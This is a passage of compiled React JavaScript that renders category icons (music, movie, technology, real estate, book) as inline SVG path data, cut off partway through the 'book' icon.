        d: "M15.5901 8.33343H11.6812V5.32988C11.6812 5.16542 11.5479 5.0321 11.3834 5.0321H10.129C9.96455 5.0321 9.83123 5.16542 9.83123 5.32988V8.33343H5.92229C5.75783 8.33343 5.62451 8.46675 5.62451 8.63121V9.88562C5.62451 10.0501 5.75783 10.1834 5.92229 10.1834H9.83123V18.125C9.83123 18.2895 9.96455 18.4228 10.129 18.4228H11.0261C11.1906 18.4228 11.3238 18.2895 11.3238 18.125C11.3238 17.9606 11.1906 17.8273 11.0261 17.8273H10.4268V9.88558C10.4268 9.72113 10.2935 9.58781 10.129 9.58781H6.22006V8.92894H10.129C10.2935 8.92894 10.4268 8.79562 10.4268 8.63117V5.62761H11.0856V8.63117C11.0856 8.79562 11.2189 8.92894 11.3834 8.92894H15.2924V9.20644C15.2924 9.37089 15.4256 9.50421 15.5901 9.50421C15.7546 9.50421 15.8879 9.37089 15.8879 9.20644V8.63121C15.8879 8.46675 15.7546 8.33343 15.5901 8.33343Z"
      }), /*#__PURE__*/React__default.createElement("path", {
        d: "M13.6721 9.58789H11.3832C11.2187 9.58789 11.0854 9.72121 11.0854 9.88566V11.648C11.0854 11.8125 11.2187 11.9458 11.3832 11.9458C11.5477 11.9458 11.681 11.8125 11.681 11.648V10.1834H13.6721C13.8365 10.1834 13.9698 10.0501 13.9698 9.88566C13.9698 9.72125 13.8365 9.58789 13.6721 9.58789Z"
      }), /*#__PURE__*/React__default.createElement("path", {
        d: "M18.8363 18.5708C18.7082 18.5844 18.58 18.5912 18.4552 18.5912C17.5111 18.5912 16.6205 18.2267 15.9475 17.5648C15.8303 17.4495 15.6418 17.451 15.5264 17.5682C15.4111 17.6855 15.4127 17.874 15.5299 17.9893C16.1672 18.6162 16.9717 19.0143 17.8412 19.142C17.2482 19.4175 16.6015 19.5605 15.9316 19.5605C13.425 19.5605 11.3857 17.5212 11.3857 15.0145C11.3857 12.5079 13.425 10.4686 15.9316 10.4686C16.6018 10.4686 17.2488 10.6116 17.8418 10.8873C15.831 11.1849 14.283 12.9223 14.283 15.0145C14.283 15.7724 14.4883 16.5146 14.8767 17.1609C14.9615 17.3019 15.1445 17.3475 15.2854 17.2628C15.4263 17.178 15.4719 16.9952 15.3872 16.8541C15.0544 16.3004 14.8785 15.6643 14.8785 15.0145C14.8785 13.0423 16.483 11.4379 18.4552 11.4379C18.5802 11.4379 18.7084 11.4447 18.8361 11.4582C18.9693 11.472 19.0948 11.3962 19.1441 11.2722C19.1935 11.1481 19.1543 11.0064 19.0481 10.9254C18.1461 10.2369 17.0684 9.87305 15.9315 9.87305C13.0965 9.87305 10.79 12.1795 10.79 15.0145C10.79 17.8496 13.0966 20.156 15.9316 20.156C17.0684 20.156 18.1461 19.7921 19.0481 19.1037C19.1543 19.0227 19.1935 18.8809 19.1442 18.7569C19.0948 18.6328 18.9685 18.5569 18.8363 18.5708Z"
      }), /*#__PURE__*/React__default.createElement("path", {
        d: "M20.6188 14.4372C20.5838 14.3295 20.4906 14.2509 20.3784 14.2346L19.1636 14.0581L18.6203 12.9573C18.5702 12.8556 18.4667 12.7913 18.3533 12.7913C18.24 12.7913 18.1364 12.8556 18.0863 12.9573L17.543 14.0581L16.3282 14.2346C16.2161 14.2509 16.1228 14.3295 16.0878 14.4373C16.0528 14.545 16.082 14.6634 16.1631 14.7425L17.0422 15.5994L16.8347 16.8093C16.8155 16.9209 16.8614 17.0339 16.9531 17.1005C17.0448 17.1671 17.1663 17.1759 17.2667 17.1231L18.3532 16.5519L19.4397 17.1231C19.4833 17.146 19.5309 17.1573 19.5782 17.1573C19.6399 17.1573 19.7014 17.1381 19.7532 17.1004C19.845 17.0338 19.8909 16.9209 19.8717 16.8092L19.6642 15.5993L20.5432 14.7425C20.6246 14.6634 20.6538 14.545 20.6188 14.4372ZM19.1366 15.2822C19.0664 15.3506 19.0345 15.4492 19.051 15.5457L19.183 16.3152L18.492 15.9519C18.4052 15.9063 18.3016 15.9063 18.2148 15.9519L17.5238 16.3152L17.6557 15.5457C17.6723 15.4491 17.6403 15.3506 17.5701 15.2822L17.011 14.7372L17.7837 14.6249C17.8807 14.6108 17.9645 14.5499 18.0079 14.462L18.3534 13.7619L18.6989 14.462C18.7423 14.5499 18.8261 14.6108 18.9232 14.6249L19.6958 14.7372L19.1366 15.2822Z"
      }), /*#__PURE__*/React__default.createElement("path", {
        d: "M6.93039 4.36999L7.97496 2.56077C8.02816 2.46866 8.02816 2.35511 7.97496 2.263C7.92176 2.17089 7.82348 2.11413 7.71711 2.11413H5.62801L4.58344 0.304873C4.53023 0.212764 4.43191 0.156006 4.32555 0.156006C4.21918 0.156006 4.12086 0.212764 4.0677 0.304873L3.02312 2.11413H0.933984C0.827578 2.11413 0.729336 2.17089 0.676133 2.263C0.62293 2.35511 0.62293 2.46866 0.676133 2.56077L1.7207 4.36999L0.676133 6.17921C0.62293 6.27132 0.62293 6.38487 0.676133 6.47698C0.729336 6.56909 0.827617 6.62585 0.933984 6.62585H3.02312L3.55621 7.54917C3.61137 7.64468 3.71145 7.69812 3.81438 7.69812C3.86488 7.69812 3.91609 7.68526 3.96297 7.65819C4.10539 7.57597 4.15418 7.39386 4.07195 7.25144L3.71078 6.62589H7.71711C7.82352 6.62589 7.92176 6.56913 7.97496 6.47702C8.02816 6.38491 8.02816 6.27136 7.97496 6.17925L6.93039 4.36999ZM7.20137 2.70968L6.5866 3.77448L5.97184 2.70968H7.20137ZM4.32555 1.04933L4.94035 2.11413H3.71074L4.32555 1.04933ZM1.44973 2.70968H2.67926L2.06449 3.77444L1.44973 2.70968ZM1.44973 6.0303L2.06449 4.9655L2.67926 6.0303H1.44973ZM3.36691 6.0303L2.40832 4.36999L3.36691 2.70968H5.28414L6.24277 4.36999L5.67402 5.35507C5.5918 5.49749 5.64059 5.6796 5.78301 5.76183C5.92539 5.84405 6.1075 5.79522 6.18976 5.65284L6.5866 4.96554L7.20137 6.0303H3.36691Z"
      }));
    case "music":
      return /*#__PURE__*/React__default.createElement("svg", _extends$3({
        width: "19",
        height: "21",
        viewBox: "0 0 19 21",
        fill: "#797C80",
        xmlns: "http://www.w3.org/2000/svg"
      }, props), alt && /*#__PURE__*/React__default.createElement("title", null, alt !== null && alt !== void 0 ? alt : "music"), /*#__PURE__*/React__default.createElement("path", {
        d: "M18.6784 4.56139V0.722458C18.6784 0.542246 18.5904 0.370416 18.4479 0.265641C18.3012 0.160867 18.1126 0.127339 17.9408 0.181822L6.50359 3.8154C6.2689 3.89083 6.10964 4.10877 6.10964 4.35603V8.19916V8.20335V15.5501C5.51033 15.1352 4.74339 14.9089 3.93872 14.9089C3.08795 14.9089 2.27909 15.1646 1.66302 15.6256C1.00085 16.1243 0.63623 16.799 0.63623 17.5325C0.63623 18.2659 1.00085 18.9406 1.66302 19.4393C2.27909 19.9004 3.08376 20.156 3.93872 20.156C4.79368 20.156 5.59834 19.9004 6.21442 19.4393C6.87659 18.9406 7.24121 18.2659 7.24121 17.5325V8.61406L17.5468 5.33672V11.8998C16.9475 11.4849 16.1806 11.2586 15.3759 11.2586C14.5251 11.2586 13.7163 11.5142 13.1002 11.9752C12.438 12.4739 12.0734 13.1487 12.0734 13.8821C12.0734 14.6155 12.438 15.2903 13.1002 15.789C13.7163 16.25 14.5209 16.5057 15.3759 16.5057C16.2308 16.5057 17.0355 16.25 17.6516 15.789C18.3138 15.2903 18.6784 14.6155 18.6784 13.8821V4.56558C18.6784 4.56139 18.6784 4.56139 18.6784 4.56139ZM3.93872 19.0244C2.76105 19.0244 1.76779 18.3413 1.76779 17.5325C1.76779 16.7236 2.76105 16.0405 3.93872 16.0405C5.11638 16.0405 6.10964 16.7236 6.10964 17.5325C6.10964 18.3455 5.11638 19.0244 3.93872 19.0244ZM7.24121 7.42383V4.76675L17.5468 1.4936V4.15067L7.24121 7.42383ZM15.3801 15.3741C14.2024 15.3741 13.2092 14.691 13.2092 13.8821C13.2092 13.0733 14.2024 12.3901 15.3801 12.3901C16.5577 12.3901 17.551 13.0733 17.551 13.8821C17.5468 14.691 16.5536 15.3741 15.3801 15.3741Z"
      }));
    case "movie":
      return /*#__PURE__*/React__default.createElement("svg", _extends$3({
        width: "24",
        height: "21",
        viewBox: "0 0 24 21",
        fill: "#797C80",
        xmlns: "http://www.w3.org/2000/svg"
      }, props), alt && /*#__PURE__*/React__default.createElement("title", null, alt !== null && alt !== void 0 ? alt : "movie"), /*#__PURE__*/React__default.createElement("path", {
        d: "M21.6784 8.58281C21.2368 8.58191 20.8062 8.71994 20.4474 8.97735L17.996 10.7186V10.161C17.996 9.46338 17.7189 8.79436 17.2256 8.30109C16.7324 7.80782 16.0633 7.5307 15.3657 7.5307H15.2448C15.8889 6.96674 16.3456 6.21976 16.5542 5.38943C16.7627 4.5591 16.713 3.68493 16.4117 2.88358C16.1105 2.08222 15.572 1.3918 14.8682 0.904453C14.1643 0.417103 13.3286 0.156006 12.4725 0.156006C11.6163 0.156006 10.7806 0.417103 10.0767 0.904453C9.37289 1.3918 8.83441 2.08222 8.53316 2.88358C8.23192 3.68493 8.18224 4.5591 8.39075 5.38943C8.59926 6.21976 9.05604 6.96674 9.70014 7.5307H7.19087C7.60223 7.07263 7.87065 6.50425 7.96307 5.89555C8.05548 5.28685 7.96785 4.66441 7.71098 4.10489C7.45411 3.54536 7.0392 3.07317 6.51735 2.74648C5.99551 2.41978 5.38951 2.25283 4.77398 2.2662C4.15845 2.27956 3.56027 2.47266 3.05309 2.8217C2.54592 3.17074 2.1519 3.66049 1.91956 4.23064C1.68722 4.80079 1.62669 5.42645 1.74544 6.03056C1.86419 6.63467 2.15703 7.19087 2.58789 7.63066C2.02991 7.77965 1.53648 8.10816 1.18376 8.56546C0.831033 9.02277 0.638626 9.58345 0.63623 10.161V17.5257C0.63623 18.2233 0.913348 18.8923 1.40662 19.3856C1.89989 19.8789 2.56891 20.156 3.2665 20.156H15.3657C16.0633 20.156 16.7324 19.8789 17.2256 19.3856C17.7189 18.8923 17.996 18.2233 17.996 17.5257V16.9681L20.4317 18.7094C20.7461 18.9407 21.1187 19.0799 21.5078 19.1116C21.8968 19.1432 22.287 19.0661 22.6348 18.8887C22.9825 18.7112 23.274 18.4406 23.4767 18.107C23.6794 17.7734 23.7853 17.39 23.7826 16.9997V10.687C23.7826 10.129 23.5609 9.59374 23.1663 9.19912C22.7717 8.80451 22.2365 8.58281 21.6784 8.58281ZM9.31612 4.37438C9.31612 3.75012 9.50124 3.13987 9.84806 2.62082C10.1949 2.10176 10.6878 1.69721 11.2646 1.45832C11.8413 1.21942 12.476 1.15691 13.0882 1.2787C13.7005 1.40049 14.2629 1.7011 14.7043 2.14252C15.1457 2.58394 15.4463 3.14634 15.5681 3.75861C15.6899 4.37088 15.6274 5.00551 15.3885 5.58225C15.1496 6.159 14.7451 6.65195 14.226 6.99877C13.707 7.34559 13.0967 7.5307 12.4725 7.5307C11.6353 7.5307 10.8325 7.19816 10.2406 6.60624C9.64866 6.01431 9.31612 5.21149 9.31612 4.37438ZM4.84466 3.32227C5.26084 3.32227 5.66767 3.44568 6.0137 3.6769C6.35974 3.90811 6.62944 4.23674 6.78871 4.62124C6.94797 5.00573 6.98964 5.42882 6.90845 5.837C6.82726 6.24518 6.62685 6.62011 6.33257 6.91439C6.03829 7.20867 5.66335 7.40908 5.25518 7.49027C4.847 7.57146 4.42391 7.52979 4.03942 7.37053C3.65492 7.21127 3.32629 6.94156 3.09507 6.59553C2.86386 6.24949 2.74045 5.84266 2.74045 5.42649C2.74045 4.86841 2.96214 4.3332 3.35676 3.93858C3.75138 3.54396 4.28659 3.32227 4.84466 3.32227ZM16.9439 17.5257C16.9439 17.9443 16.7776 18.3457 16.4817 18.6417C16.1857 18.9376 15.7843 19.1039 15.3657 19.1039H3.2665C2.84795 19.1039 2.44653 18.9376 2.15057 18.6417C1.85461 18.3457 1.68834 17.9443 1.68834 17.5257V10.161C1.68834 9.74242 1.85461 9.34101 2.15057 9.04505C2.44653 8.74908 2.84795 8.58281 3.2665 8.58281H15.3657C15.7843 8.58281 16.1857 8.74908 16.4817 9.04505C16.7776 9.34101 16.9439 9.74242 16.9439 10.161V17.5257ZM22.7305 16.9997C22.7363 17.1982 22.6858 17.3943 22.5848 17.5653C22.4838 17.7363 22.3365 17.8752 22.1598 17.966C21.9832 18.0568 21.7845 18.0958 21.5866 18.0784C21.3888 18.0609 21.1999 17.9879 21.0419 17.8677L17.996 15.6793V11.9969L21.0419 9.8243C21.1996 9.70438 21.3879 9.63142 21.5853 9.61383C21.7826 9.59624 21.9809 9.63473 22.1574 9.72487C22.3338 9.81501 22.4812 9.95314 22.5826 10.1234C22.684 10.2936 22.7353 10.489 22.7305 10.687V16.9997Z"
      }));
    case "technology":
      return /*#__PURE__*/React__default.createElement("svg", _extends$3({
        width: "21",
        height: "21",
        viewBox: "0 0 21 21",
        fill: "#797C80",
        xmlns: "http://www.w3.org/2000/svg"
      }, props), alt && /*#__PURE__*/React__default.createElement("title", null, alt !== null && alt !== void 0 ? alt : "technology"), /*#__PURE__*/React__default.createElement("path", {
        d: "M20.3571 5.4065C20.3571 5.4065 20.3571 5.4065 20.357 5.4065L20.3564 5.40584L19.0651 5.2216C18.8836 5.19575 18.7574 5.02766 18.7832 4.84616C18.7956 4.75894 18.8422 4.68027 18.9127 4.6274L19.9564 3.84465C20.1031 3.73465 20.1328 3.5266 20.0228 3.37991L18.8277 1.78653C18.7177 1.63984 18.5097 1.61013 18.363 1.72014L17.3197 2.50289C17.1736 2.61372 16.9654 2.58517 16.8545 2.43911C16.8007 2.3682 16.7777 2.27861 16.7905 2.19052L16.9751 0.89921C17.0011 0.717714 16.8751 0.549537 16.6936 0.523478C16.6935 0.523478 16.6934 0.523437 16.6933 0.523437L14.7228 0.241939C14.5413 0.21588 14.373 0.341857 14.347 0.523354C14.347 0.523395 14.347 0.523395 14.347 0.523437L14.1624 1.81474C14.1366 1.99624 13.9685 2.12242 13.787 2.09657C13.6998 2.08417 13.6211 2.03757 13.5682 1.96711L12.7858 0.923443C12.6758 0.77676 12.4677 0.74705 12.3211 0.857052L11.3235 1.60561C10.8722 1.55764 10.4171 1.55764 9.96584 1.60561C7.01036 1.94342 4.69269 4.30038 4.40459 7.26114C4.39563 7.35508 4.39231 7.44836 4.38766 7.54164H4.28807C4.13056 7.54193 3.99492 7.65289 3.96342 7.8072L3.73404 8.89801L2.81519 8.26431C2.68332 8.17331 2.50522 8.18953 2.39194 8.30281L1.39608 9.29868C1.28296 9.41192 1.26678 9.58976 1.35757 9.72159L1.98829 10.6388L0.897148 10.8682C0.744532 10.9016 0.635899 11.0369 0.636231 11.1932V12.521C0.636148 12.678 0.74615 12.8136 0.899804 12.846L1.99094 13.0753L1.36023 13.9925C1.26944 14.1244 1.28562 14.3022 1.39873 14.4154L2.3946 15.4113C2.50788 15.5246 2.68597 15.5408 2.81784 15.4498L3.73504 14.8174L3.96442 15.9086C3.99591 16.0629 4.13156 16.1739 4.28907 16.1741H5.61689C5.77391 16.1742 5.90951 16.0642 5.94188 15.9106L6.17126 14.8194L7.08845 15.4501C7.22028 15.5409 7.39812 15.5248 7.51136 15.4116L8.02689 14.8945V15.8405C8.02838 16.3128 8.28137 16.7484 8.6908 16.9838V18.8281C8.6908 19.5615 9.28529 20.1559 10.0186 20.1559H11.3464C12.0798 20.1559 12.6743 19.5615 12.6743 18.8281V16.9838C13.0837 16.7484 13.3367 16.3128 13.3382 15.8405V14.5266C13.3472 13.9738 13.6364 13.4634 14.106 13.1716C14.3815 12.9929 14.6427 12.7931 14.8874 12.5741L14.4446 12.0795C14.2257 12.2757 13.9918 12.4545 13.7452 12.6143C13.086 13.028 12.6825 13.7485 12.6743 14.5266V15.8405C12.6743 16.2072 12.377 16.5044 12.0104 16.5044H9.35471C8.98802 16.5044 8.6908 16.2072 8.6908 15.8405V14.4991C8.68312 13.7356 8.28598 13.029 7.63784 12.6255C5.0068 10.9723 4.21409 7.49927 5.86731 4.86824C6.89305 3.2358 8.68321 2.24222 10.6112 2.23533C10.6062 2.24716 10.6019 2.25923 10.5982 2.27151C10.5859 2.35865 10.6087 2.44716 10.6616 2.51749L11.444 3.56083C11.5265 3.66759 11.5345 3.81424 11.464 3.9293C11.3961 4.04507 11.2648 4.10822 11.132 4.08897L9.84069 3.9044C9.6592 3.87839 9.49102 4.0044 9.46496 4.18586C9.46496 4.18598 9.46492 4.18611 9.46492 4.18623L9.18309 6.15772C9.15707 6.33917 9.28309 6.50739 9.46455 6.53345C9.46467 6.53345 9.4648 6.53349 9.46492 6.53349L10.7562 6.71806C10.9377 6.74391 11.0639 6.912 11.0381 7.0935C11.0256 7.18072 10.9791 7.25939 10.9086 7.31226L9.86526 8.09468C9.71857 8.20468 9.68886 8.41273 9.79887 8.55942L10.9939 10.1528C11.1039 10.2995 11.312 10.3292 11.4586 10.2192L12.5023 9.43677C12.6491 9.32698 12.8572 9.35698 12.967 9.50383C13.0195 9.57408 13.0421 9.6623 13.0298 9.74914L12.8456 11.0405C12.8195 11.2219 12.9455 11.3902 13.127 11.4162C13.127 11.4162 13.127 11.4162 13.1271 11.4162L15.0989 11.6981C15.1144 11.7 15.13 11.701 15.1457 11.701C15.3109 11.7013 15.4512 11.5798 15.4746 11.4162L15.6589 10.1249C15.6847 9.94342 15.8528 9.81724 16.0343 9.84309C16.1215 9.85549 16.2002 9.90209 16.2531 9.97255L17.0358 11.0159C17.1458 11.1626 17.3539 11.1923 17.5006 11.0823L19.094 9.88724C19.2406 9.77724 19.2703 9.56918 19.1603 9.4225L18.3779 8.37916C18.2958 8.27223 18.2879 8.12584 18.358 8.01069C18.4244 7.89339 18.5569 7.82982 18.69 7.85135L19.9813 8.03559C20.1627 8.06165 20.331 7.93563 20.357 7.75417C20.357 7.75413 20.357 7.75413 20.357 7.75409L20.6385 5.78228C20.6646 5.60078 20.5386 5.43256 20.3571 5.4065ZM9.35471 17.1683H12.0104V17.8323H9.35471V17.1683ZM9.35471 18.4962H12.0104V18.8281C12.0104 19.1948 11.7131 19.492 11.3464 19.492H10.0186C9.65193 19.492 9.35471 19.1948 9.35471 18.8281V18.4962ZM6.71201 12.7716C6.89326 12.9198 7.08264 13.0578 7.27932 13.1849C7.59298 13.3831 7.82908 13.683 7.94822 14.0344L7.23617 14.7451L6.5467 14.2697C6.24479 14.0617 5.83138 14.1378 5.62328 14.4397C5.5734 14.5121 5.53838 14.5937 5.52029 14.6797L5.34635 15.5086H4.55729L4.38334 14.681C4.30782 14.3222 3.95574 14.0925 3.59694 14.1681C3.51092 14.1861 3.42935 14.2212 3.35694 14.271L2.66714 14.7451L2.06231 14.1416L2.53734 13.4524C2.7456 13.1507 2.66975 12.7372 2.36796 12.5289C2.29551 12.4789 2.21385 12.4438 2.12771 12.4257L1.30014 12.2514V11.4627L2.12771 11.2884C2.48639 11.2124 2.71552 10.86 2.63946 10.5012C2.62141 10.4161 2.58684 10.3354 2.53767 10.2637L2.06231 9.57254L2.66714 8.96905L3.35727 9.44441C3.65931 9.65225 4.07272 9.5759 4.28056 9.27387C4.33036 9.20154 4.36529 9.12005 4.38334 9.03411L4.44144 8.75793C4.49463 9.14042 4.58273 9.51719 4.70468 9.88358C3.61242 10.0138 2.83253 11.0048 2.96274 12.0971C3.09295 13.1894 4.084 13.9693 5.17626 13.839C5.83378 13.7606 6.40935 13.3606 6.71201 12.7716ZM6.19649 12.3039C5.9486 12.9929 5.18913 13.3505 4.50011 13.1026C3.81109 12.8548 3.4535 12.0953 3.70134 11.4063C3.89097 10.8792 4.39144 10.5281 4.95161 10.5292C4.95593 10.5292 4.95991 10.5292 4.96423 10.5292C5.2695 11.1875 5.68639 11.7878 6.19649 12.3039ZM19.7449 7.33052L18.7822 7.19309C18.2378 7.11533 17.7334 7.49371 17.6556 8.03816C17.6182 8.29962 17.6863 8.56522 17.8448 8.77651L18.4281 9.55429L17.3658 10.351L16.7822 9.57354C16.4523 9.13349 15.8281 9.04424 15.388 9.3742C15.1768 9.53263 15.037 9.76852 14.9996 10.03L14.8652 10.994L13.551 10.8061L13.6884 9.84342C13.7664 9.29897 13.3882 8.7944 12.8437 8.71647C12.5821 8.679 12.3164 8.74705 12.105 8.90564L11.3272 9.48889L10.5305 8.42663L11.3079 7.84306C11.748 7.51309 11.8372 6.88889 11.5073 6.44888C11.3489 6.23759 11.113 6.09788 10.8515 6.06045L9.88883 5.92302L10.0767 4.60881L11.0394 4.74624C11.5838 4.82421 12.0884 4.44603 12.1663 3.90158C12.2038 3.63996 12.1358 3.37423 11.9772 3.16281L11.3919 2.38438L12.4542 1.58769L13.0378 2.36546C13.3677 2.80551 13.9919 2.89476 14.4319 2.5648C14.6432 2.40637 14.7829 2.17048 14.8204 1.90902L14.9578 0.946348L16.272 1.1339L16.1346 2.09657C16.0568 2.64106 16.4352 3.14547 16.9796 3.22323C17.2411 3.26058 17.5067 3.19252 17.718 3.03402L18.4958 2.45077L19.2925 3.51303L18.5147 4.09661C18.0746 4.42657 17.9854 5.05077 18.3154 5.49078C18.4738 5.70207 18.7097 5.84178 18.9711 5.87921L19.9338 6.01664L19.7449 7.33052Z"
      }), /*#__PURE__*/React__default.createElement("path", {
        d: "M14.91 3.31348C13.4434 3.31348 12.2544 4.50246 12.2544 5.96912C12.2544 7.43578 13.4434 8.62476 14.91 8.62476C16.3767 8.62476 17.5657 7.43578 17.5657 5.96912C17.564 4.50312 16.376 3.31509 14.91 3.31348ZM14.91 7.96085C13.81 7.96085 12.9183 7.06914 12.9183 5.96912C12.9183 4.8691 13.81 3.97739 14.91 3.97739C16.0101 3.97739 16.9018 4.8691 16.9018 5.96912C16.9005 7.0686 16.0095 7.95957 14.91 7.96085Z"
      }), /*#__PURE__*/React__default.createElement("path", {
        d: "M11.0145 14.8447H10.3506V15.8406H11.0145V14.8447Z"
      }), /*#__PURE__*/React__default.createElement("path", {
        d: "M9.23092 11.5844C7.18172 10.7839 6.16946 8.47376 6.97002 6.42456C7.28023 5.63052 7.83696 4.95695 8.55838 4.50283L8.20352 3.94116C6.03187 5.30928 5.38045 8.17882 6.74856 10.3505C7.2784 11.1915 8.06398 11.8405 8.98992 12.2022C9.80952 12.5162 10.3507 13.303 10.3509 14.1807H11.0149C11.0159 13.0291 10.3063 11.9964 9.23092 11.5844Z"
      }), /*#__PURE__*/React__default.createElement("path", {
        d: "M19.3134 12.521H16.9897V13.1849H19.3134V12.521Z"
      }), /*#__PURE__*/React__default.createElement("path", {
        d: "M16.8703 14.2575L16.4453 14.7676L18.4372 16.4271L18.8622 15.917L16.8703 14.2575Z"
      }), /*#__PURE__*/React__default.createElement("path", {
        d: "M15.662 15.1763H14.998V17.5H15.662V15.1763Z"
      }), /*#__PURE__*/React__default.createElement("path", {
        d: "M3.63056 5.22805L0.975098 5.89185L1.13602 6.53558L3.79148 5.87179L3.63056 5.22805Z"
      }), /*#__PURE__*/React__default.createElement("path", {
        d: "M1.91155 1.96078L1.52588 2.50073L3.84938 4.16034L4.23506 3.62038L1.91155 1.96078Z"
      }), /*#__PURE__*/React__default.createElement("path", {
        d: "M5.0138 0.156106L4.37061 0.320557L5.04954 2.976L5.69274 2.81154L5.0138 0.156106Z"
      }));
    case "real-estate":
      return /*#__PURE__*/React__default.createElement("svg", _extends$3({
        width: "21",
        height: "20",
        viewBox: "0 0 28 20",
        fill: "#797C80",
        xmlns: "http://www.w3.org/2000/svg"
      }, props), alt && /*#__PURE__*/React__default.createElement("title", null, alt !== null && alt !== void 0 ? alt : "real-estate"), /*#__PURE__*/React__default.createElement("path", {
        d: "M10.1816 5.90918H11.0907V7.72736H10.1816V5.90918Z"
      }), /*#__PURE__*/React__default.createElement("path", {
        d: "M2.45508 7.27319H3.36417V9.09138H2.45508V7.27319Z"
      }), /*#__PURE__*/React__default.createElement("path", {
        d: "M4.27197 7.27319H5.18106V9.09138H4.27197V7.27319Z"
      }), /*#__PURE__*/React__default.createElement("path", {
        d: "M6.09082 7.27319H6.99991V9.09138H6.09082V7.27319Z"
      }), /*#__PURE__*/React__default.createElement("path", {
        d: "M12.0005 5.90918H12.9096V7.72736H12.0005V5.90918Z"
      }), /*#__PURE__*/React__default.createElement("path", {
        d: "M13.8174 5.90918H14.7265V7.72736H13.8174V5.90918Z"
      }), /*#__PURE__*/React__default.createElement("path", {
        d: "M15.6362 5.90918H16.5453V7.72736H15.6362V5.90918Z"
      }), /*#__PURE__*/React__default.createElement("path", {
        d: "M17.4551 5.90918H18.3642V7.72736H17.4551V5.90918Z"
      }), /*#__PURE__*/React__default.createElement("path", {
        d: "M2.45508 11.8186H3.36417V13.6368H2.45508V11.8186Z"
      }), /*#__PURE__*/React__default.createElement("path", {
        d: "M4.27197 11.8186H5.18106V13.6368H4.27197V11.8186Z"
      }), /*#__PURE__*/React__default.createElement("path", {
        d: "M6.09082 11.8186H6.99991V13.6368H6.09082V11.8186Z"
      }), /*#__PURE__*/React__default.createElement("path", {
        d: "M2.45508 16.364H3.36417V18.1822H2.45508V16.364Z"
      }), /*#__PURE__*/React__default.createElement("path", {
        d: "M4.27197 16.364H5.18106V18.1822H4.27197V16.364Z"
      }), /*#__PURE__*/React__default.createElement("path", {
        d: "M6.09082 16.364H6.99991V18.1822H6.09082V16.364Z"
      }), /*#__PURE__*/React__default.createElement("path", {
        d: "M25.1816 7.27319H26.0907V9.09138H25.1816V7.27319Z"
      }), /*#__PURE__*/React__default.createElement("path", {
        d: "M23.3633 7.27319H24.2724V9.09138H23.3633V7.27319Z"
      }), /*#__PURE__*/React__default.createElement("path", {
        d: "M21.5454 7.27319H22.4545V9.09138H21.5454V7.27319Z"
      }), /*#__PURE__*/React__default.createElement("path", {
        d: "M27.7758 5.58769L25.9577 3.7695C25.8724 3.68426 25.7568 3.63636 25.6362 3.63636H20.6362V2.38001L21.4973 0.65782C21.532 0.588522 21.5484 0.511513 21.5449 0.434108C21.5414 0.356703 21.5182 0.281471 21.4775 0.21556C21.4367 0.149648 21.3798 0.0952451 21.3121 0.0575174C21.2445 0.0197897 21.1683 -9.52e-06 21.0908 3.43395e-09H7.45441C7.37693 -9.52e-06 7.30073 0.0197897 7.23305 0.0575174C7.16537 0.0952451 7.10847 0.149648 7.06773 0.21556C7.027 0.281471 7.00379 0.356703 7.00031 0.434108C6.99683 0.511513 7.0132 0.588522 7.04786 0.65782L7.90896 2.38001V3.63636H2.90896C2.7884 3.63636 2.67278 3.68426 2.58752 3.7695L0.769342 5.58769C0.727293 5.62995 0.69399 5.68009 0.671339 5.73524C0.648689 5.7904 0.637135 5.84947 0.63734 5.90909H0.63623V19.5455C0.636232 19.666 0.684121 19.7816 0.769365 19.8669C0.854609 19.9521 0.970223 20 1.09078 20H27.4544C27.575 20 27.6906 19.9521 27.7758 19.8669C27.8611 19.7816 27.909 19.666 27.909 19.5455V5.90909H27.9078C27.9081 5.84947 27.8965 5.7904 27.8738 5.73524C27.8512 5.68009 27.8179 5.62995 27.7758 5.58769ZM1.54532 10.9091H7.90896V14.5455H1.54532V10.9091ZM1.54532 10V6.36364H7.90896V10H1.54532ZM19.7271 4.09091H8.81805V2.72727H19.7271V4.09091ZM8.81805 5H19.7271V8.63636H8.81805V5ZM20.6362 10.9091H26.9999V14.5455H20.6362V10.9091ZM20.6362 10V6.36364H26.9999V10H20.6362ZM25.448 4.54545L26.3571 5.45455H20.6362V4.54545H25.448ZM20.3553 0.909091L19.9008 1.81818H8.64442L8.18989 0.909091H20.3553ZM3.09722 4.54545H7.90896V5.45455H2.18813L3.09722 4.54545ZM1.54532 15.4545H7.90896V19.0909H1.54532V15.4545ZM12.909 14.0909V13.1818H15.6362V14.0909H12.909ZM16.5453 13.1818H16.9999V19.0909H16.5453V13.1818ZM10.6362 12.2727V11.3636H17.909V12.2727H10.6362ZM11.9999 13.1818V19.0909H11.5453V13.1818H11.9999ZM12.909 15H13.818V19.0909H12.909V15ZM14.7271 19.0909V15H15.6362V19.0909H14.7271ZM17.909 19.0909V13.1818H18.3635C18.4841 13.1818 18.5997 13.1339 18.6849 13.0487C18.7702 12.9634 18.818 12.8478 18.818 12.7273V10.9091C18.818 10.7885 18.7702 10.6729 18.6849 10.5877C18.5997 10.5024 18.4841 10.4545 18.3635 10.4545H10.1817C10.0611 10.4545 9.94552 10.5024 9.86027 10.5877C9.77503 10.6729 9.72714 10.7885 9.72714 10.9091V12.7273C9.72714 12.8478 9.77503 12.9634 9.86027 13.0487C9.94552 13.1339 10.0611 13.1818 10.1817 13.1818H10.6362V19.0909H8.81805V9.54545H19.7271V19.0909H17.909ZM20.6362 19.0909V15.4545H26.9999V19.0909H20.6362Z"
      }), /*#__PURE__*/React__default.createElement("path", {
        d: "M25.1816 11.8186H26.0907V13.6368H25.1816V11.8186Z"
      }), /*#__PURE__*/React__default.createElement("path", {
        d: "M23.3633 11.8186H24.2724V13.6368H23.3633V11.8186Z"
      }), /*#__PURE__*/React__default.createElement("path", {
        d: "M21.5454 11.8186H22.4545V13.6368H21.5454V11.8186Z"
      }), /*#__PURE__*/React__default.createElement("path", {
        d: "M25.1816 16.364H26.0907V18.1822H25.1816V16.364Z"
      }), /*#__PURE__*/React__default.createElement("path", {
        d: "M23.3633 16.364H24.2724V18.1822H23.3633V16.364Z"
      }), /*#__PURE__*/React__default.createElement("path", {
        d: "M21.5454 16.364H22.4545V18.1822H21.5454V16.364Z"
      }));
    case "book":
      return /*#__PURE__*/React__default.createElement("svg", _extends$3({
        width: "29",
        height: "21",
        viewBox: "0 0 29 21",
        fill: "#797C80",
        xmlns: "http://www.w3.org/2000/svg"
      }, props), alt && /*#__PURE__*/React__default.createElement("title", null, alt !== null && alt !== void 0 ? alt : "book"), /*#__PURE__*/React__default.createElement("path", {
